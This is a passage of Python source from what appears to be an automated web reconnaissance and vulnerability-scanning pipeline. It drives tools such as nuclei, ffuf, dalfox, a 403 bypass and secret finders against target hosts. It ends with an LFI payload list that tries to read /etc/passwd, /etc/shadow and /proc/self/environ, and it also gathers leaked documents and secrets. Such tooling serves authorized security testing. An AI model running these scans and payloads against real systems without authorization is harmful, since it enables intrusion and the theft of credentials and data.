                        logger.warning(f"{color.RED}(-) paramspider not found in PATH{color.END}")
                    except subprocess.TimeoutExpired:
                        logger.warning("paramspider timed out, skipping")
                    except Exception as e:
                        logger.debug(f"paramspider failed: {e}")
                    return ("params", b"")

                logger.info(f"{color.GREEN}(+) Collecting URLs in parallel (waybackurls, gau, waymore, paramspider){color.END}")
                params_out = f"{self.output_file}/urls/params.txt"
                with concurrent.futures.ThreadPoolExecutor(max_workers=4) as ex:
                    futures = [
                        ex.submit(_run_waybackurls),
                        ex.submit(_run_gau),
                        ex.submit(_run_waymore),
                        ex.submit(_run_paramspider),
                    ]
                    for fut in concurrent.futures.as_completed(futures):
                        try:
                            dest, data = fut.result()
                            if not data:
                                continue
                            target = urls if dest == "urls" else params_out
                            subprocess.run(["anew", target], input=data,
                                           capture_output=True, timeout=60)
                        except Exception as e:
                            logger.debug(f"URL collector thread failed: {e}")

            # Extract JS URLs with Python regex (Windows-safe, no grep)
            self._filter_urls_by_regex(urls, r"\.js($|\?)", self.js_output)

            # Run gf patterns in parallel
            gf_list = ["xss", "ssrf", "lfi", "sqli", "ssti", "redirect"]
            gf_output_dir = f"{self.output_file}/urls/"

            def _run_gf(pattern):
                out_file = os.path.join(gf_output_dir, f"gf-{pattern}.txt")
                try:
                    with open(urls, "rb") as urls_f:
                        p_gf = subprocess.run(["gf", pattern], stdin=urls_f,
                                              capture_output=True, timeout=300)
                    if p_gf.stderr and p_gf.returncode not in (0, 1):
                        logger.debug(f"gf {pattern} stderr: {p_gf.stderr.decode(errors='replace')}")
                    if p_gf.stdout and p_gf.stdout.strip():
                        subprocess.run(["anew", out_file], input=p_gf.stdout,
                                       check=False, timeout=60)
                except FileNotFoundError:
                    pass  # gf not installed — caller handles missing tool warning
                except subprocess.TimeoutExpired:
                    logger.warning(f"gf {pattern} timed out, skipping")
                except Exception as e:
                    logger.warning(f"gf {pattern} failed: {e}")

            if os.path.isfile(urls) and os.path.getsize(urls) > 0:
                if shutil.which("gf"):
                    with concurrent.futures.ThreadPoolExecutor(max_workers=6) as ex:
                        list(ex.map(_run_gf, gf_list))
                else:
                    logger.warning(
                        f"{color.RED}gf not found in PATH; install from https://github.com/tomnomnom/gf{color.END}")

            # Alias lfi-urls.txt from gf-lfi.txt; extract domains into lfi-subs.txt
            gf_lfi = os.path.join(gf_output_dir, "gf-lfi.txt")
            lfi_urls_out = f"{self.output_file}/vuln/lfi-urls.txt"
            lfi_subs_out = f"{self.output_file}/vuln/lfi-subs.txt"
            try:
                if os.path.isfile(gf_lfi) and os.path.getsize(gf_lfi) > 0:
                    shutil.copy2(gf_lfi, lfi_urls_out)
                    seen_subs = set()
                    with open(gf_lfi, "r", encoding="utf-8", errors="replace") as lf:
                        with open(lfi_subs_out, "w", encoding="utf-8") as sf:
                            for line in lf:
                                url = line.strip()
                                if not url:
                                    continue
                                parsed = urlparse(url)
                                host = f"{parsed.scheme}://{parsed.netloc}" if parsed.netloc else url
                                if host not in seen_subs:
                                    seen_subs.add(host)
                                    sf.write(host + "\n")
            except Exception as e:
                logger.debug(f"lfi alias failed: {e}")

        except Exception as e:
            logger.exception(
                f"{color.RED}Error occurred during URL collection: {e}{color.END}"
            )

    def extract_js_files(self):
        """Extract JavaScript files from collected URLs (Python regex, Windows-safe)"""
        try:
            logger.info(f"{color.GREEN}[+] Extracting JS files...{color.END}")
            all_urls = f"{self.output_file}/urls/all-urls.txt"
            if not os.path.isfile(all_urls) or os.path.getsize(all_urls) == 0:
                logger.warning(
                    f"{color.RED}(-) all-urls.txt missing or empty, skipping JS extraction{color.END}")
                return
            self._filter_urls_by_regex(
                all_urls, r"\.(js|json)($|\?)", self.js_output)
            logger.info(
                f"{color.GREEN}[+] Completed: JS files saved to {self.js_output}{color.END}"
            )
        except FileNotFoundError as e:
            logger.warning(f"{color.RED}(-) {e}{color.END}")
        except Exception as e:
            logger.exception(f"{color.RED}Error occurred: {e}{color.END}")

    def extract_documents(self):
        """Extract document and backup files from collected URLs (Python regex, Windows-safe)"""
        try:
            logger.info(
                f"{color.GREEN}[+] Extracting documents and backup files...{color.END}"
            )
            doc_file_types = r"\.xls|\.xml|\.xlsx|\.json|\.pdf|\.sql|\.doc|\.docx|\.pptx|\.txt|\.zip|\.tar\.gz|\.tgz|\.bak|\.7z|\.rar"
            all_urls_path = f"{self.output_file}/urls/all-urls.txt"
            if not os.path.isfile(all_urls_path) or os.path.getsize(all_urls_path) == 0:
                logger.warning(
                    f"{color.RED}(-) all-urls.txt missing or empty, skipping document extraction{color.END}")
                return
            self._filter_urls_by_regex(
                all_urls_path, doc_file_types, self.leaked_docs)
            logger.info(
                f"{color.GREEN}[+] Completed: Sensitive documents saved to {self.leaked_docs}{color.END}"
            )
        except FileNotFoundError as e:
            logger.warning(f"{color.RED}(-) {e}{color.END}")
        except Exception as e:
            logger.exception(f"{color.RED}Error occurred: {e}{color.END}")

    def extract_js_data_with_mantra(self):
        """Extract data from JavaScript files using Mantra"""
        if not shutil.which("mantra"):
            logger.warning(f"{color.RED}(-) mantra not found in PATH, skipping{color.END}")
            return
        try:
            logger.info(
                f"{color.GREEN}[+] Extracting data from JS files using Mantra...{color.END}"
            )
            mantra_files = [self.all_urls, self.js_output]
            for src in mantra_files:
                if not os.path.isfile(src) or os.path.getsize(src) == 0:
                    continue
                with open(src, "rb") as f_in:
                    p_mantra = subprocess.run(
                        ["mantra"],
                        stdin=f_in,
                        capture_output=True,
                        timeout=600,
                    )
                if p_mantra.stdout and p_mantra.stdout.strip():
                    subprocess.run(
                        ["anew", self.mantra_output],
                        input=p_mantra.stdout,
                        capture_output=True,
                        timeout=60,
                    )
            logger.info(
                f"{color.GREEN}[+] Completed: Mantra findings saved to {self.mantra_output}{color.END}"
            )
        except FileNotFoundError:
            logger.warning(
                f"{color.RED}(-) mantra or anew not found in PATH{color.END}"
            )
        except subprocess.TimeoutExpired:
            logger.warning(f"{color.RED}(-) mantra timed out{color.END}")
        except Exception as e:
            logger.exception(f"{color.RED}Error occurred: {e}{color.END}")


class Nuclei:
    """Class to run Nuclei vulnerability scanner"""

    def __init__(self, domains, output_file, config=None):
        """
        Initialize with domains file and output directory

        Args:
            domains (str): Path to file containing target domains
            output_file (str): Path to output directory
            config (dict): Optional nuclei config section from YAML
        """
        self.domains     = domains
        self.output_file = output_file
        cfg = (config or {})
        self.rate_limit  = str(cfg.get("rate_limit",  150))
        self.bulk_size   = str(cfg.get("bulk_size",   25))
        self.concurrency = str(cfg.get("concurrency", 10))

    def _update_templates(self):
        """Update nuclei templates silently before scanning."""
        try:
            logger.info(f"{color.GREEN}(+) Updating nuclei templates{color.END}")
            subprocess.run(["nuclei", "-update-templates", "-silent"],
                           capture_output=True, timeout=120)
        except (FileNotFoundError, subprocess.TimeoutExpired, Exception):
            pass

    def basic_nuclei(self):
        """Run Nuclei scan on alive hosts — critical/high/medium, targeted tags"""
        hosts = f"{self.output_file}/hosts/alive-hosts.txt"
        output = f"{self.output_file}/vuln/nuclei-output.txt"
        try:
            if not os.path.isfile(hosts) or os.path.getsize(hosts) == 0:
                logger.warning(
                    f"{color.RED}(-) No alive hosts file for Nuclei, skipping{color.END}")
                return
            self._update_templates()
            nuclei_cmd = [
                "nuclei", "-l", hosts, "-o", output,
                "-severity", "critical,high,medium",
                "-tags", "exposure,misconfiguration,default-login,takeover,cve,exposed-panels,network,token-spray",
                "-retries", "2",
                "-rl", self.rate_limit,
                "-bs", self.bulk_size,
                "-c",  self.concurrency,
            ]
            logger.info(f"{color.GREEN}(+) Nuclei active scanning{color.END}")
            p = subprocess.run(nuclei_cmd, capture_output=True, timeout=3600)
            if p.returncode != 0 and p.stderr:
                logger.debug(
                    f"nuclei stderr: {p.stderr.decode(errors='replace')}")
        except FileNotFoundError:
            logger.warning(
                f"{color.RED}(-) nuclei not found in PATH{color.END}")
        except subprocess.TimeoutExpired:
            logger.warning(f"{color.RED}(-) nuclei timed out{color.END}")
        except Exception as e:
            logger.exception(f"{color.RED}(-) Error occurred: {e}{color.END}")

    def dast_nuclei(self):
        """Run DAST Nuclei scan on all URLs"""
        urls = f"{self.output_file}/urls/all-urls.txt"
        output = f"{self.output_file}/vuln/nuclei-dast-output.txt"
        try:
            if not os.path.isfile(urls) or os.path.getsize(urls) == 0:
                logger.warning(
                    f"{color.RED}(-) No URLs file for Nuclei DAST, skipping{color.END}")
                return
            with open(urls, "rb") as f_in:
                p = subprocess.run(
                    ["nuclei", "--dast", "-o", output],
                    stdin=f_in,
                    capture_output=True,
                    timeout=3600,
                )
            if p.returncode != 0 and p.stderr:
                logger.debug(
                    f"nuclei dast stderr: {p.stderr.decode(errors='replace')}")
            logger.info(
                f"{color.GREEN}(+) Nuclei dast active scanning {color.END}")
        except FileNotFoundError:
            logger.warning(
                f"{color.RED}(-) nuclei not found in PATH{color.END}")
        except subprocess.TimeoutExpired:
            logger.warning(f"{color.RED}(-) nuclei DAST timed out{color.END}")
        except Exception as e:
            logger.exception(f"{color.RED}(-) Error occurred: {e}{color.END}")


class DirFuzzer:
    """Class to perform directory fuzzing on alive hosts using ffuf"""

    def __init__(self, output_file, wordlist, threads=40, timeout=10, match_codes="200,204,301,302,307,401,403"):
        """
        Initialize with output directory and ffuf options

        Args:
            output_file (str): Path to output directory
            wordlist (str): Path to wordlist file
            threads (int): Number of concurrent threads
            timeout (int): Per-request timeout in seconds
            match_codes (str): Comma-separated HTTP status codes to match
        """
        self.output_file = output_file
        self.wordlist = wordlist
        self.threads = threads
        self.timeout = timeout
        self.match_codes = match_codes

    def fuzz(self):
        """Run ffuf directory fuzzing against each alive host"""
        hosts_file = f"{self.output_file}/hosts/alive-hosts.txt"
        output = f"{self.output_file}/vuln/ffuf-output.txt"
        try:
            if not shutil.which("ffuf"):
                logger.warning(
                    f"{color.RED}(-) ffuf not found in PATH, skipping directory fuzzing{color.END}")
                return
            if not os.path.isfile(hosts_file) or os.path.getsize(hosts_file) == 0:
                logger.warning(
                    f"{color.RED}(-) No alive hosts file for ffuf, skipping{color.END}")
                return
            default_wordlist = os.path.expanduser("~/Tools/wordlists/ffuf-common.txt")
            wordlist = os.path.expanduser(self.wordlist) if self.wordlist else default_wordlist
            if not os.path.isfile(wordlist):
                logger.warning(
                    f"{color.RED}(-) Wordlist not found: {wordlist}, skipping directory fuzzing{color.END}")
                return
            self.wordlist = wordlist

            logger.info(f"{color.GREEN}(+) Directory fuzzing with ffuf (parallel, max 5 hosts){color.END}")

            with open(hosts_file, "r", encoding="utf-8", errors="replace") as f:
                hosts = [line.strip() for line in f if line.strip()]

            results_lock = threading.Lock()
            all_results = []

            def _fuzz_host(host):
                url = host.rstrip("/") + "/FUZZ"
                logger.info(f"{color.SKY_BLUE}(+) ffuf -> {host}{color.END}")
                safe_name = host.replace("://", "_").replace("/", "_")
                tmp_path = f"{self.output_file}/vuln/.ffuf_tmp_{safe_name}.json"
                ffuf_cmd = [
                    "ffuf", "-u", url, "-w", self.wordlist,
                    "-t", str(self.threads), "-timeout", str(self.timeout),
                    "-mc", self.match_codes, "-o", tmp_path, "-of", "json", "-s",
                ]
                try:
                    p = subprocess.run(ffuf_cmd, capture_output=True, timeout=1800)
                    if p.returncode != 0 and p.stderr:
                        logger.debug(f"ffuf stderr ({host}): {p.stderr.decode(errors='replace')}")
                    if os.path.isfile(tmp_path) and os.path.getsize(tmp_path) > 0:
                        with open(tmp_path, "r", encoding="utf-8", errors="replace") as tf:
                            data = json.load(tf)
                        hits = data.get("results", [])
                        if hits:
                            lines = [f"# {host}\n"]
                            for r in hits:
                                lines.append(
                                    f"{r['url']} [Status: {r['status']}, Size: {r['length']}, Words: {r['words']}, Lines: {r['lines']}]\n"
                                )
                            lines.append("\n")
                            with results_lock:
                                all_results.extend(lines)
                except subprocess.TimeoutExpired:
                    logger.warning(f"{color.RED}(-) ffuf timed out for {host}{color.END}")
                except Exception as e:
                    logger.debug(f"ffuf failed for {host}: {e}")
                finally:
                    if os.path.isfile(tmp_path):
                        os.unlink(tmp_path)

            with concurrent.futures.ThreadPoolExecutor(max_workers=5) as ex:
                list(ex.map(_fuzz_host, hosts))

            with open(output, "w", encoding="utf-8") as out_f:
                out_f.writelines(all_results)

            logger.info(
                f"{color.GREEN}(+) Directory fuzzing completed, results saved to {output}{color.END}"
            )
            logger.info(f"\n{color.SKY_BLUE}{'=' * 40}{color.END}\n")

        except FileNotFoundError:
            logger.warning(
                f"{color.RED}(-) ffuf not found in PATH{color.END}")
        except Exception as e:
            logger.exception(f"{color.RED}(-) Error during directory fuzzing: {e}{color.END}")


class CorsScanner:
    """Class to scan for CORS misconfigurations on alive hosts"""

    def __init__(self, output_file):
        self.output_file = output_file

    def scan(self):
        """Run CORS misconfiguration scan using corsy"""
        hosts_file = f"{self.output_file}/hosts/alive-hosts.txt"
        output = f"{self.output_file}/vuln/cors.txt"
        try:
            if not os.path.isfile(hosts_file) or os.path.getsize(hosts_file) == 0:
                logger.warning(
                    f"{color.RED}(-) No alive hosts for CORS scan, skipping{color.END}")
                return
            if not shutil.which("corsy"):
                logger.warning(
                    f"{color.RED}(-) corsy not found in PATH, skipping CORS scan{color.END}")
                return
            logger.info(f"{color.GREEN}(+) Running CORS misconfiguration scan{color.END}")
            p = subprocess.run(
                ["corsy", "-i", hosts_file, "-o", output],
                capture_output=True,
                timeout=1800,
            )
            if p.returncode != 0 and p.stderr:
                logger.debug(f"corsy stderr: {p.stderr.decode(errors='replace')}")
            logger.info(
                f"{color.GREEN}(+) CORS scan completed, results saved to {output}{color.END}")
            logger.info(f"\n{color.SKY_BLUE}{'=' * 40}{color.END}\n")
        except FileNotFoundError:
            logger.warning(f"{color.RED}(-) corsy not found in PATH{color.END}")
        except subprocess.TimeoutExpired:
            logger.warning(f"{color.RED}(-) CORS scan timed out{color.END}")
        except Exception as e:
            logger.exception(f"{color.RED}Error during CORS scan: {e}{color.END}")


class CrlfScanner:
    """Class to scan for CRLF injection vulnerabilities"""

    def __init__(self, output_file):
        self.output_file = output_file

    def scan(self):
        """Run CRLF injection scan using crlfuzz"""
        urls_file = f"{self.output_file}/urls/all-urls.txt"
        output = f"{self.output_file}/vuln/crlf.txt"
        try:
            if not os.path.isfile(urls_file) or os.path.getsize(urls_file) == 0:
                logger.warning(
                    f"{color.RED}(-) No URLs for CRLF scan, skipping{color.END}")
                return
            if not shutil.which("crlfuzz"):
                logger.warning(
                    f"{color.RED}(-) crlfuzz not found in PATH, skipping CRLF scan{color.END}")
                return
            logger.info(f"{color.GREEN}(+) Running CRLF injection scan{color.END}")
            p = subprocess.run(
                ["crlfuzz", "-l", urls_file, "-o", output],
                capture_output=True,
                timeout=1800,
            )
            if p.returncode != 0 and p.stderr:
                logger.debug(f"crlfuzz stderr: {p.stderr.decode(errors='replace')}")
            logger.info(
                f"{color.GREEN}(+) CRLF scan completed, results saved to {output}{color.END}")
            logger.info(f"\n{color.SKY_BLUE}{'=' * 40}{color.END}\n")
        except FileNotFoundError:
            logger.warning(f"{color.RED}(-) crlfuzz not found in PATH{color.END}")
        except subprocess.TimeoutExpired:
            logger.warning(f"{color.RED}(-) CRLF scan timed out{color.END}")
        except Exception as e:
            logger.exception(f"{color.RED}Error during CRLF scan: {e}{color.END}")


class DirectoryFuzzer:
    """Class to perform directory and path discovery using dirsearch"""

    def __init__(self, output_file, wordlist="", threads=25,
                 extensions="php,html,js,txt,json,xml,bak,zip"):
        self.output_file = output_file
        self.wordlist = wordlist
        self.threads = threads
        self.extensions = extensions

    def fuzz(self):
        """Run dirsearch on alive hosts"""
        hosts_file = f"{self.output_file}/hosts/alive-hosts.txt"
        output = f"{self.output_file}/vuln/dirsearch-output.txt"
        try:
            if not shutil.which("dirsearch"):
                logger.warning(
                    f"{color.RED}(-) dirsearch not found in PATH, skipping{color.END}")
                return
            if not os.path.isfile(hosts_file) or os.path.getsize(hosts_file) == 0:
                logger.warning(
                    f"{color.RED}(-) No alive hosts for dirsearch, skipping{color.END}")
                return
            logger.info(f"{color.GREEN}(+) Directory discovery with dirsearch{color.END}")
            cmd = [
                "dirsearch",
                "-l", hosts_file,
                "-t", str(self.threads),
                "-e", self.extensions,
                "--format", "plain",
                "-o", output,
            ]
            if self.wordlist and os.path.isfile(os.path.expanduser(self.wordlist)):
                cmd += ["-w", os.path.expanduser(self.wordlist)]
            p = subprocess.run(cmd, capture_output=True, timeout=3600)
            if p.returncode != 0 and p.stderr:
                logger.debug(f"dirsearch stderr: {p.stderr.decode(errors='replace')}")
            logger.info(
                f"{color.GREEN}(+) dirsearch completed, results saved to {output}{color.END}")
            logger.info(f"\n{color.SKY_BLUE}{'=' * 40}{color.END}\n")
        except FileNotFoundError:
            logger.warning(f"{color.RED}(-) dirsearch not found in PATH{color.END}")
        except subprocess.TimeoutExpired:
            logger.warning(f"{color.RED}(-) dirsearch timed out{color.END}")
        except Exception as e:
            logger.exception(f"{color.RED}Error during dirsearch: {e}{color.END}")


class FourOhThreeBypasser:
    """Class to attempt bypass of 403 Forbidden responses"""

    def __init__(self, output_file):
        self.output_file = output_file

    def bypass(self):
        """Run 403 bypass attempts using bypass-403"""
        hosts_file = f"{self.output_file}/hosts/alive-hosts.txt"
        output = f"{self.output_file}/vuln/403-bypass.txt"
        try:
            if not shutil.which("bypass-403"):
                logger.warning(
                    f"{color.RED}(-) bypass-403 not found in PATH, skipping 403 bypass{color.END}")
                return
            if not os.path.isfile(hosts_file) or os.path.getsize(hosts_file) == 0:
                logger.warning(
                    f"{color.RED}(-) No alive hosts for 403 bypass, skipping{color.END}")
                return
            logger.info(f"{color.GREEN}(+) Running 403 bypass checks{color.END}")
            with open(hosts_file, "r", encoding="utf-8", errors="replace") as f:
                hosts = [line.strip() for line in f if line.strip()]
            results = []
            for host in hosts:
                logger.info(f"{color.SKY_BLUE}(+) bypass-403 -> {host}{color.END}")
                try:
                    p = subprocess.run(
                        ["bypass-403", "-u", host],
                        capture_output=True,
                        timeout=120,
                    )
                    if p.stdout and p.stdout.strip():
                        results.append(
                            f"# {host}\n{p.stdout.decode(errors='replace')}\n")
                except subprocess.TimeoutExpired:
                    logger.debug(f"bypass-403 timed out for {host}")
            if results:
                with open(output, "w", encoding="utf-8") as out_f:
                    out_f.writelines(results)
            logger.info(
                f"{color.GREEN}(+) 403 bypass completed, results saved to {output}{color.END}")
            logger.info(f"\n{color.SKY_BLUE}{'=' * 40}{color.END}\n")
        except FileNotFoundError:
            logger.warning(f"{color.RED}(-) bypass-403 not found in PATH{color.END}")
        except Exception as e:
            logger.exception(f"{color.RED}Error during 403 bypass: {e}{color.END}")


class ApiDiscovery:
    """Class to discover API endpoints on alive hosts using kiterunner or ffuf"""

    def __init__(self, output_file, wordlist=""):
        self.output_file = output_file
        self.wordlist = wordlist

    def discover(self):
        """Discover API endpoints; prefers kiterunner (kr), falls back to ffuf"""
        hosts_file = f"{self.output_file}/hosts/alive-hosts.txt"
        output = f"{self.output_file}/vuln/api-endpoints.txt"
        try:
            if not os.path.isfile(hosts_file) or os.path.getsize(hosts_file) == 0:
                logger.warning(
                    f"{color.RED}(-) No alive hosts for API discovery, skipping{color.END}")
                return
            if shutil.which("kr"):
                self._discover_with_kr(hosts_file, output)
            elif shutil.which("ffuf"):
                self._discover_with_ffuf(hosts_file, output)
            else:
                logger.warning(
                    f"{color.RED}(-) Neither kr nor ffuf found in PATH, skipping API discovery{color.END}")
                return
            logger.info(f"\n{color.SKY_BLUE}{'=' * 40}{color.END}\n")
        except Exception as e:
            logger.exception(f"{color.RED}Error during API discovery: {e}{color.END}")

    def _discover_with_kr(self, hosts_file, output):
        """API discovery via kiterunner"""
        logger.info(f"{color.GREEN}(+) Running API discovery with kiterunner{color.END}")
        routes = os.path.expanduser(self.wordlist) if self.wordlist and os.path.isfile(
            os.path.expanduser(self.wordlist)) else None
        cmd = ["kr", "scan", hosts_file]
        if routes:
            cmd += ["-w", routes]
        else:
            cmd += ["-A=apiroutes-210228:20000"]
        try:
            p = subprocess.run(cmd, capture_output=True, timeout=1800)
            if p.stdout and p.stdout.strip():
                with open(output, "wb") as f:
                    f.write(p.stdout)
            if p.returncode != 0 and p.stderr:
                logger.debug(f"kr stderr: {p.stderr.decode(errors='replace')}")
            logger.info(
                f"{color.GREEN}(+) API discovery completed, results saved to {output}{color.END}")
        except FileNotFoundError:
            logger.warning(f"{color.RED}(-) kr not found in PATH{color.END}")
        except subprocess.TimeoutExpired:
            logger.warning(f"{color.RED}(-) kiterunner timed out{color.END}")

    def _discover_with_ffuf(self, hosts_file, output):
        """API discovery fallback via ffuf"""
        logger.info(f"{color.GREEN}(+) Running API discovery with ffuf{color.END}")
        api_wordlist = os.path.expanduser(self.wordlist) if self.wordlist else os.path.expanduser(
            "~/Tools/wordlists/api-endpoints.txt")
        if not os.path.isfile(api_wordlist):
            logger.warning(
                f"{color.RED}(-) No API wordlist found for ffuf, skipping API discovery{color.END}")
            return
        try:
            with open(hosts_file, "r", encoding="utf-8", errors="replace") as f:
                hosts = [line.strip() for line in f if line.strip()]
            with open(output, "w", encoding="utf-8") as out_f:
                for host in hosts:
                    url = host.rstrip("/") + "/FUZZ"
                    tmp_path = (
                        f"{self.output_file}/vuln/.api_ffuf_tmp_"
                        f"{host.replace('://', '_').replace('/', '_')}.json"
                    )
                    try:
                        p = subprocess.run(
                            [
                                "ffuf", "-u", url, "-w", api_wordlist,
                                "-mc", "200,201,204,301,302,401,403,405",
                                "-o", tmp_path, "-of", "json", "-s",
                            ],
                            capture_output=True,
                            timeout=600,
                        )
                        if os.path.isfile(tmp_path) and os.path.getsize(tmp_path) > 0:
                            with open(tmp_path, "r", encoding="utf-8", errors="replace") as tf:
                                data = json.load(tf)
                            hits = data.get("results", [])
                            if hits:
                                out_f.write(f"# {host}\n")
                                for r in hits:
                                    out_f.write(
                                        f"{r['url']} [Status: {r['status']}, Size: {r['length']}]\n")
                                out_f.write("\n")
                    except subprocess.TimeoutExpired:
                        logger.debug(f"ffuf api scan timed out for {host}")
                    finally:
                        if os.path.isfile(tmp_path):
                            os.unlink(tmp_path)
            logger.info(
                f"{color.GREEN}(+) API discovery completed, results saved to {output}{color.END}")
        except FileNotFoundError:
            logger.warning(f"{color.RED}(-) ffuf not found in PATH{color.END}")
        except subprocess.TimeoutExpired:
            logger.warning(f"{color.RED}(-) ffuf API scan timed out{color.END}")


class DalfoxScanner:
    """Test XSS parameters found by gf using dalfox"""

    def __init__(self, output_file):
        self.output_file = output_file

    def scan(self):
        xss_params = f"{self.output_file}/urls/gf-xss.txt"
        output = f"{self.output_file}/vuln/dalfox-xss.txt"
        if not shutil.which("dalfox"):
            logger.warning(f"{color.RED}(-) dalfox not found in PATH, skipping XSS testing{color.END}")
            return
        if not os.path.isfile(xss_params) or os.path.getsize(xss_params) == 0:
            logger.warning(f"{color.RED}(-) No gf-xss.txt for dalfox, skipping{color.END}")
            return
        try:
            logger.info(f"{color.GREEN}(+) Testing XSS parameters with dalfox{color.END}")
            p = subprocess.run(
                ["dalfox", "file", xss_params, "--skip-bav", "-o", output],
                capture_output=True, timeout=3600,
            )
            if p.returncode != 0 and p.stderr:
                logger.debug(f"dalfox stderr: {p.stderr.decode(errors='replace')}")
            if os.path.isfile(output) and os.path.getsize(output) > 0:
                with open(output, "r", encoding="utf-8", errors="replace") as f:
                    hits = [l for l in f if l.strip()]
                logger.info(f"{color.RED}[!] dalfox: {len(hits)} XSS finding(s) → {output}{color.END}")
            else:
                logger.info(f"{color.GREEN}(+) dalfox: no XSS confirmed{color.END}")
            logger.info(f"\n{color.SKY_BLUE}{'=' * 40}{color.END}\n")
        except subprocess.TimeoutExpired:
            logger.warning(f"{color.RED}(-) dalfox timed out{color.END}")
        except Exception as e:
            logger.exception(f"{color.RED}Error during dalfox scan: {e}{color.END}")


class OpenRedirectScanner:
    """Test open redirect parameters using openredirex"""

    def __init__(self, output_file):
        self.output_file = output_file

    def scan(self):
        redirect_params = f"{self.output_file}/urls/gf-redirect.txt"
        all_urls = f"{self.output_file}/urls/all-urls.txt"
        output = f"{self.output_file}/vuln/open-redirects.txt"

        # Prefer gf-redirect.txt, fall back to all-urls.txt
        src = redirect_params if (os.path.isfile(redirect_params) and os.path.getsize(redirect_params) > 0) \
            else (all_urls if (os.path.isfile(all_urls) and os.path.getsize(all_urls) > 0) else None)

        if not shutil.which("openredirex"):
            logger.warning(f"{color.RED}(-) openredirex not found in PATH, skipping open redirect testing{color.END}")
            return
        if not src:
            logger.warning(f"{color.RED}(-) No URL file for openredirex, skipping{color.END}")
            return
        try:
            logger.info(f"{color.GREEN}(+) Testing open redirects with openredirex{color.END}")
            p = subprocess.run(
                ["openredirex", "-l", src],
                capture_output=True, timeout=1800,
            )
            if p.stdout and p.stdout.strip():
                with open(output, "wb") as f:
                    f.write(p.stdout)
                hits = [l for l in p.stdout.decode(errors="replace").splitlines() if l.strip()]
                logger.info(f"{color.RED}[!] openredirex: {len(hits)} open redirect(s) → {output}{color.END}")
            else:
                logger.info(f"{color.GREEN}(+) openredirex: no open redirects found{color.END}")
            logger.info(f"\n{color.SKY_BLUE}{'=' * 40}{color.END}\n")
        except subprocess.TimeoutExpired:
            logger.warning(f"{color.RED}(-) openredirex timed out{color.END}")
        except Exception as e:
            logger.exception(f"{color.RED}Error during open redirect scan: {e}{color.END}")


class SecretScanner:
    """Extract secrets from JS files using secretfinder + trufflehog"""

    def __init__(self, output_file):
        self.output_file = output_file

    def secretfinder(self):
        js_file = f"{self.output_file}/urls/js-files.txt"
        output = f"{self.output_file}/vuln/secrets.txt"
        if not shutil.which("secretfinder"):
            logger.warning(f"{color.RED}(-) secretfinder not found in PATH, skipping{color.END}")
            return
        if not os.path.isfile(js_file) or os.path.getsize(js_file) == 0:
            logger.warning(f"{color.RED}(-) No js-files.txt for secretfinder, skipping{color.END}")
            return
        try:
            logger.info(f"{color.GREEN}(+) Running secretfinder on JS files (parallel){color.END}")
            with open(js_file, "r", encoding="utf-8", errors="replace") as f:
                js_urls = [u.strip() for u in f if u.strip()]

            findings_lock = threading.Lock()
            findings = []

            def _scan_url(url):
                try:
                    p = subprocess.run(
                        ["secretfinder", "-i", url, "-o", "cli"],
                        capture_output=True, timeout=30,
                    )
                    if p.stdout and p.stdout.strip():
                        out = p.stdout.decode(errors="replace").strip()
                        if out:
                            with findings_lock:
                                findings.append(f"# {url}\n{out}\n")
                except subprocess.TimeoutExpired:
                    logger.debug(f"secretfinder timed out for {url}")
                except Exception as e:
                    logger.debug(f"secretfinder failed for {url}: {e}")

            with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
                list(ex.map(_scan_url, js_urls))

            if findings:
                with open(output, "w", encoding="utf-8") as out_f:
                    out_f.writelines(findings)
                logger.info(f"{color.RED}[!] secretfinder: {len(findings)} JS file(s) with secrets → {output}{color.END}")
            else:
                logger.info(f"{color.GREEN}(+) secretfinder: no secrets found in JS files{color.END}")
            logger.info(f"\n{color.SKY_BLUE}{'=' * 40}{color.END}\n")
        except Exception as e:
            logger.exception(f"{color.RED}Error during secretfinder scan: {e}{color.END}")

    def trufflehog(self):
        output_dir = self.output_file
        output = f"{self.output_file}/vuln/trufflehog.txt"
        if not shutil.which("trufflehog"):
            logger.warning(f"{color.RED}(-) trufflehog not found in PATH, skipping{color.END}")
            return
        try:
            logger.info(f"{color.GREEN}(+) Running trufflehog on scan results directory{color.END}")
            p = subprocess.run(
                ["trufflehog", "filesystem", output_dir, "--json", "--no-update"],
                capture_output=True, timeout=600,
            )
            if p.stdout and p.stdout.strip():
                with open(output, "wb") as f:
                    f.write(p.stdout)
                hits = [l for l in p.stdout.decode(errors="replace").splitlines() if l.strip()]
                logger.info(f"{color.RED}[!] trufflehog: {len(hits)} secret(s) found → {output}{color.END}")
            else:
                logger.info(f"{color.GREEN}(+) trufflehog: no secrets found{color.END}")
        except subprocess.TimeoutExpired:
            logger.warning(f"{color.RED}(-) trufflehog timed out{color.END}")
        except Exception as e:
            logger.exception(f"{color.RED}Error during trufflehog scan: {e}{color.END}")


class LFIScanner:
    """Test extracted LFI-candidate URLs for path traversal and local file inclusion."""

    PAYLOADS = [
        # Classic traversal
        "../../../../etc/passwd",
        "../../../etc/passwd",
        "../../etc/passwd",
        # URL-encoded
        "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        # Double-encoded
        "..%252F..%252F..%252Fetc%252Fpasswd",
        # Null-byte (legacy PHP)
        "../../../../etc/passwd%00",
        "../../../../etc/passwd%00.jpg",
        # Absolute path injection
        "/etc/passwd",
        "file:///etc/passwd",
        # PHP wrappers
        "php://filter/convert.base64-encode/resource=/etc/passwd",
        "php://filter/read=convert.base64-encode/resource=../../../etc/passwd",
        "expect://id",
        # Windows targets
        "..\\..\\..\\..\\windows\\win.ini",
        "..%5C..%5C..%5Cwindows%5Cwin.ini",
        "C:/windows/win.ini",
        "C:\\windows\\win.ini",
        # /proc / /etc variants
        "../../../../proc/self/environ",
        "../../../../etc/shadow",
        "../../../../etc/hosts",
    ]

    SUCCESS_SIGNATURES = [
        b"root:x:0:0",
        b"root:!:",
        b"[boot loader]",
        b"[fonts]",
        b"for 16-bit app support",
        b"<?php",
        b"/bin/bash",
        b"/bin/sh",
        b"daemon:x:",
        b"nobody:x:",
        b"uid=",           # expect://id output
    ]

    def __init__(self, output_file: str, threads: int = 20, timeout: int = 10):
        self.output_file = output_file
        self.threads     = threads
        self.timeout     = timeout
        self.lfi_urls    = os.path.join(output_file, "vuln", "lfi-urls.txt")
        self.out_file    = os.path.join(output_file, "vuln", "lfi-traversal.txt")

        session = requests.Session()
        adapter = HTTPAdapter(max_retries=Retry(total=2, backoff_factor=0.3,
